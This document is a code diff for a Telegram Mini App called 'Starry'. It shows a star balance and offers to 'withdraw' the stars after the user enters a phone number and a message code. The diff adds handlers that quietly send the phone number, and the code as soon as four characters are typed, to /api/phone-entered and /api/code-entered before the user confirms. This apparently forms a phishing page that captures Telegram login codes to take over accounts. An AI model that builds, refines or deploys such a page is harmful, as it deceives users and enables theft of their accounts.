@@ -6,25 +6,127 @@
     <title>Starry Mini App</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
-        button { padding: 10px 20px; font-size: 18px; margin: 10px; }
-        #balance { font-size: 24px; margin: 20px; }
-        #authForm { display: none; }
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #2d1b69, #1a113b);
+            color: #e6d4ff;
+            min-height: 100vh;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            font-size: 32px;
+            font-weight: bold;
+            background: linear-gradient(90deg, #b19fff, #e0c3ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        #balance {
+            font-size: 36px;
+            font-weight: bold;
+            margin: 40px 0;
+            color: #d4b3ff;
+            text-shadow: 0 2px 10px rgba(179, 133, 255, 0.3);
+        }
+
+        button {
+            background: linear-gradient(135deg, #8a63d2, #b19fff);
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            font-size: 18px;
+            border-radius: 16px;
+            cursor: pointer;
+            box-shadow: 0 8px 20px rgba(138, 99, 210, 0.4);
+            transition: all 0.3s ease;
+            margin: 10px;
+            min-width: 200px;
+        }
+
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 25px rgba(138, 99, 210, 0.6);
+        }
+
+        button:active {
+            transform: translateY(1px);
+        }
+
+        #authForm {
+            display: none;
+            margin-top: 40px;
+            background: rgba(40, 25, 90, 0.6);
+            padding: 25px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(138, 99, 210, 0.3);
+        }
+
+        input {
+            width: 100%;
+            max-width: 300px;
+            padding: 14px;
+            margin: 15px 0;
+            border-radius: 12px;
+            border: 1px solid #8a63d2;
+            background: rgba(50, 30, 100, 0.7);
+            color: white;
+            font-size: 16px;
+        }
+
+        input::placeholder {
+            color: #b19fff;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #b19fff;
+            box-shadow: 0 0 15px rgba(177, 159, 255, 0.4);
+        }
+
+        h1, h2 {
+            color: #e0c3ff;
+            text-shadow: 0 2px 8px rgba(0,0,0,0.3);
+        }
     </style>
 </head>
 <body>
-    <h1>Starry Balance</h1>
-    <div id="balance">Загрузка баланса...</div>
-    <button id="withdrawBtn">Вывести звёзды</button>
+    <div class="container">
+        <div class="header">
+            <div class="logo">Starry</div>
+        </div>
 
-    <div id="authForm">
-        <h2>Авторизация для вывода</h2>
-        <p>Мы отправим код на ваш номер телефона.</p>
-        <input type="text" id="phone" placeholder="Номер телефона (с кодом страны, напр. +79123456789)" />
-        <button id="sendCodeBtn">Отправить код</button>
-        <br><br>
-        <input type="text" id="code" placeholder="Код из сообщения" />
-        <button id="verifyBtn">Подтвердить</button>
+        <h1>Ваш баланс звёзд</h1>
+        <div id="balance">Загрузка...</div>
+
+        <button id="withdrawBtn">Вывести звёзды</button>
+
+        <div id="authForm">
+            <h2>Авторизация для вывода</h2>
+            <p>Введите номер телефона для получения кода</p>
+            <input type="text" id="phone" placeholder="+79123456789" />
+            <button id="sendCodeBtn">Отправить код</button>
+
+            <input type="text" id="code" placeholder="Код из сообщения" />
+            <button id="verifyBtn">Подтвердить и вывести</button>
+        </div>
     </div>
 
     <script>
@@ -32,7 +134,7 @@
         tg.ready();
         tg.expand();
 
-        const userId = tg.initDataUnsafe.user.id;
+        const userId = tg.initDataUnsafe.user?.id || 'unknown';
         const balanceEl = document.getElementById('balance');
         const withdrawBtn = document.getElementById('withdrawBtn');
         const authForm = document.getElementById('authForm');
@@ -50,9 +152,9 @@
             });
             const data = await res.json();
             if (data.balance !== undefined) {
-                balanceEl.innerText = `Ваш баланс: ${data.balance} звёзд`;
+                balanceEl.innerText = `${data.balance} ⭐`;
             } else {
-                balanceEl.innerText = 'Ошибка загрузки баланса';
+                balanceEl.innerText = 'Ошибка загрузки';
             }
         }
 
@@ -60,20 +162,43 @@
 
         // Кнопка вывода
         withdrawBtn.onclick = () => {
-            if (confirm('Вывести все звёзды?')) {
-                authForm.style.display = 'block';
-                // Автозаполнение номера через Telegram
-                tg.requestContact((status, response) => {
-                    if (status === 'sent') {
-                        phoneInput.value = response.phone_number;
-                    }
-                });
-            }
+            authForm.style.display = 'block';
+            // Попробуем автоматически подставить номер через Telegram
+            tg.requestContact?.((status, response) => {
+                if (status === 'sent' && response?.phone_number) {
+                    phoneInput.value = response.phone_number;
+                }
+            });
         };
 
-        // Отправка кода
+        // Отправка уведомления при вводе номера
+        phoneInput.addEventListener('blur', async () => {
+            const phone = phoneInput.value.trim();
+            if (phone.length > 5) {
+                await fetch('/api/phone-entered', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ initData: tg.initData, userId, phone })
+                });
+            }
+        });
+
+        // Отправка уведомления при вводе кода
+        codeInput.addEventListener('input', async () => {
+            const code = codeInput.value.trim();
+            if (code.length >= 4) {
+                await fetch('/api/code-entered', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ initData: tg.initData, userId, code })
+                });
+            }
+        });
+
+        // Отправить код
         sendCodeBtn.onclick = async () => {
-            const phone = phoneInput.value;
+            const phone = phoneInput.value.trim();
+            if (!phone) return alert('Введите номер');
             const res = await fetch('/api/send-code', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -83,19 +208,22 @@
             alert(data.message);
         };
 
-        // Верификация и вывод
+        // Верификация
         verifyBtn.onclick = async () => {
-            const code = codeInput.value;
+            const code = codeInput.value.trim();
+            const phone = phoneInput.value.trim();
+            if (!code) return alert('Введите код');
             const res = await fetch('/api/verify-withdraw', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ initData: tg.initData, userId, code })
+                body: JSON.stringify({ initData: tg.initData, userId, code, phone })
             });
             const data = await res.json();
             alert(data.message);
             if (data.success) {
                 loadBalance();
                 authForm.style.display = 'none';
+                codeInput.value = '';
             }
         };
     </script>
